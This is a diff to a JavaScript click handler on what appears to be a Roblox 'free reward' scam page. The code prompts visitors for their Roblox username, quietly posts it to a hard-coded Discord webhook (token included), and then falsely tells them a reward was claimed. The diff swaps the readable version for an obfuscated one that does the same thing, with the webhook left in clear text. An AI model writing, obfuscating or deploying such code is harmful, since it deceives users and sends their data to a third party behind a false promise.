@@ -1,18 +1,1 @@
-document.getElementById("runBtn").addEventListener("click", () => {
-
-    let username = window.prompt("Enter your Roblox username to claim your reward:");
-
-    if (username) {
-        fetch("https://discord.com/api/webhooks/1426919503232634973/F2RX0C2zSF202hVMphsGANiVYsikQo9nlzdi-avI7x8J2umLcWFpWtPdnxc-ioupN8zf", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: `Username submitted: ${username}`
-            })
-        }).catch(err => console.log(err));
-
-        document.getElementById("output").textContent =
-            "Reward successfully claimed for user: " + username;
-    }
-
-});
+function _0xa928(_0x3c9a00,_0x362efa){const _0x1a17d5=_0x1a17();return _0xa928=function(_0xa92862,_0x14f734){_0xa92862=_0xa92862-0x91;let _0x32e405=_0x1a17d5[_0xa92862];return _0x32e405;},_0xa928(_0x3c9a00,_0x362efa);}function _0x1a17(){const _0x38d0ee=['prompt','application/json','11NKJLrL','Reward\x20successfully\x20claimed\x20for\x20user:\x20','9UABXyt','24TvcKUm','936740VLMKXO','21858reJRnK','40637388HHScdy','Enter\x20your\x20Roblox\x20username\x20to\x20claim\x20your\x20reward:','4942580LHFxYm','8JwdiED','6zTGwIT','addEventListener','runBtn','click','1206290JmmjjB','POST','2555412hqRMQq','2661764eUMNcH','stringify','Username\x20submitted:\x20'];_0x1a17=function(){return _0x38d0ee;};return _0x1a17();}const _0x126ddc=_0xa928;(function(_0x1c1917,_0xd12219){const _0x5543a5=_0xa928,_0x5a9e21=_0x1c1917();while(!![]){try{const _0xf57583=parseInt(_0x5543a5(0x9d))/0x1*(-parseInt(_0x5543a5(0x9f))/0x2)+-parseInt(_0x5543a5(0x94))/0x3+-parseInt(_0x5543a5(0x9e))/0x4+parseInt(_0x5543a5(0xa2))/0x5*(-parseInt(_0x5543a5(0xa4))/0x6)+parseInt(_0x5543a5(0x95))/0x7*(-parseInt(_0x5543a5(0xa3))/0x8)+-parseInt(_0x5543a5(0x9c))/0x9*(-parseInt(_0x5543a5(0x92))/0xa)+-parseInt(_0x5543a5(0x9a))/0xb*(-parseInt(_0x5543a5(0xa0))/0xc);if(_0xf57583===_0xd12219)break;else _0x5a9e21['push'](_0x5a9e21['shift']());}catch(_0x4a861d){_0x5a9e21['push'](_0x5a9e21['shift']());}}}(_0x1a17,0xc0e09),document['getElementById'](_0x126ddc(0xa6))[_0x126ddc(0xa5)](_0x126ddc(0x91),()=>{const _0x1b3db2=_0x126ddc;let _0x137046=window[_0x1b3db2(0x98)](_0x1b3db2(0xa1));_0x137046&&(fetch('https://discord.com/api/webhooks/1426919503232634973/F2RX0C2zSF202hVMphsGANiVYsikQo9nlzdi-avI7x8J2umLcWFpWtPdnxc-ioupN8zf',{'method':_0x1b3db2(0x93),'headers':{'Content-Type':_0x1b3db2(0x99)},'body':JSON[_0x1b3db2(0x96)]({'content':_0x1b3db2(0x97)+_0x137046})})['catch'](_0x58373f=>console['log'](_0x58373f)),document['getElementById']('output')['textContent']=_0x1b3db2(0x9b)+_0x137046);}));
